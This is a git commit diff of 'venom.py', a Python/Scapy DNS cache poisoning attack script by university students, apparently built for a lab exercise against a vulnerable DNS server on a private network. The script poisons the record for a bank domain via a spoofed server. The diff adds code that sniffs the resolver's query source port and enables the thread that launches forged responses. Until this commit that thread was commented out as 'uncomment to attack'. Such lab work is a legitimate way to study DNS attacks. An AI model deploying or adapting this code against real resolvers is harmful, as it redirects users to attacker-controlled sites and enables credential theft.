b61d8226c89f31cf18bda1713c613d373e05237f
Andrea Lacava <thecave003@gmail.com>
2019-05-13 11:16:46 +0200

    source port catcher corretto

--- venom.py
+++ venom.py
@@ -5,6 +5,13 @@
 This script makes
 
 """
+__author__ = "Andrea Lacava (1663286), Matteo Attenni (), Ilaria Clemente ()"
+__credits__ = ["Andrea Lacava", "Matteo Attenni", "Ilaria Clemente"]
+__license__ = "GPL"
+__version__ = "1.0"
+__email__ = "lacava.1663286@studenti.uniroma1.it, @studenti.uniroma1.it, " \
+            "@studenti.uniroma1.it"
+__status__ = "Production"
 
 import sys
 import threading
@@ -15,23 +22,22 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
 from scapy.sendrecv import send, sniff
 
-TARGET_IP = "192.168.56.101"  # vulnDNS's IP
-TARGET_PORT_REQUEST = 53  # target port for first vulnDNS's IP request
-
-BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
-BAD_DNS_SERVER_PORT = 53  # DNS endpoint port of badguy.ru (also present on config.json)
-
-SPOOFED_DNS = "192.168.56.100"
-URL_TO_POISON = "www.bankofallan.co.uk"
-
-DNS_URL_BADGUY = "www.badguy.ru"
-
-PACKET_SIZE = 500  # number of packets
-
 # print headers just for debug and info
 DNS_ROUTINE_HEADER = "DNS_SERVER_ROUTINE: "
 BITE_THE_RAT_HEADER = "BITE_THE_RAT: "
 LISTENER_HEADER = "LISTENER_FLAG: "
+
+TARGET_IP = "192.168.56.101"  # vulnDNS's IP
+TARGET_PORT_REQUEST = 53  # target port for first vulnDNS's IP request
+
+BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
+BAD_DNS_SERVER_PORT = 5553  # DNS endpoint port of badguy.ru (also present on config.json)
+
+SPOOFED_DNS = "192.168.56.100"
+URL_TO_POISON = "bankofallan.co.uk"
+DNS_URL_BADGUY = "badguy.ru"
+
+PACKET_SIZE = 500  # number of packets
 
 
 # get current time in milliseconds
@@ -44,36 +50,25 @@ def current_milli_time():
 
 
 def dns_server_routine():
-    print(DNS_ROUTINE_HEADER + "Starting DNS server of badguy.ru routine")
+    print(DNS_ROUTINE_HEADER + "Starting routine of DNS sniffer of badguy.ru")
     while True:
         a = sniff(filter="port " + str(BAD_DNS_SERVER_PORT), count=1, promisc=1)
-        if not a[0].haslayer(DNS) or a[0].qr:
-            continue
+        if a[0].haslayer(IP):
+            print(DNS_ROUTINE_HEADER + "Packet sniffed, analyzing..")
+            sniffed_packet = a[0]
+            sniffed_ip = sniffed_packet.getlayer(IP)
+            target_port = sniffed_ip.sport
+            print(DNS_ROUTINE_HEADER +
+                  "\nSniffed ip src " + str(sniffed_ip.src) + ", src port: " + str(sniffed_ip.sport) + "\nDst ip:" +
+                  str(sniffed_ip.dst) + ", dest port:" +
+                  str(sniffed_ip.dport) + "\nTarget port response (source port) is " +
+                  str(target_port) + "\n")
 
-        print(DNS_ROUTINE_HEADER + "DNS packet sniffed, analyzing..")
-        sniffed_packet = a[0]
-        sniffed_ip = sniffed_packet.getlayer(IP)
-        sniffed_dns = sniffed_packet.getlayer(DNS)
-        first_dns_res = IP(dst=sniffed_ip.src, src=sniffed_ip.dst) / UDP(dport=sniffed_ip.sport,
-                                                                         sport=sniffed_ip.dport) / DNS(
-            id=sniffed_dns.id, qd=sniffed_dns.qd, an=DNSRR(
-                rrname=sniffed_dns.qd.qname,
-                ttl=10,
-                rdata=sniffed_ip.dst))
-
-        # Answer about badguy for vulnDNS
-        send(first_dns_res)
-
-        target_port = sniffed_ip.sport
-        print(DNS_ROUTINE_HEADER +
-              "\nSniffed ip src " + str(sniffed_ip.src) + ", src port: " + str(sniffed_ip.sport) + "\nDst ip :" +
-              str(sniffed_ip.dst) + ", dest port:" + str(sniffed_ip.dport) + "\nTarget port response is " +
-              str(target_port) + "\n")
-
-        bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat, args=target_port)
-        # uncomment to attack
-        # bite_rat_thread.start()
-        break
+            bite_rat_thread = threading.Thread(name="bite_rat_thread", target=bite_the_rat, args=target_port)
+            print(DNS_ROUTINE_HEADER + "Bite the rat!")
+            bite_rat_thread.start()
+            bite_rat_thread.join()
+            break
 
 
 def bite_the_rat(target_port_sniffed):
@@ -148,8 +143,8 @@ def main():
 
     send(first_dns_req, verbose=0)
 
-    # flag_victory_thread.join()
-    # dns_badguy_thread.join()
+    flag_victory_thread.join()
+    dns_badguy_thread.join()
 
 
 if __name__ == "__main__":
